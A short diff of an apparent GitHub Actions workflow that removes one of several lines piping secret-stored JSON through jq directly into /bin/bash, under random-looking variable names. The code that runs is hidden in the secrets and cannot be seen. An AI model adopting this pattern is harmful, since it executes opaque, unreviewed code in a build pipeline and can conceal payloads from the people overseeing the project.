@@ -18,7 +18,6 @@ jobs:
           vuj92381: ${{ secrets.vuj92381 }}
         run: |
           printf '%s' "$vuj92381" | jq -r .gsj5 | /bin/bash
-          printf '%s' "$q3833" | jq -r .r14 | /bin/bash
           echo $bevfi6 | jq -r .mdrb18072 | /bin/bash
           printf '%s' "$sfyr2221" | jq -r .ocq354 | /bin/bash
           printf '%s' "$xodab8" | jq -r .lwf2598 | /bin/bash
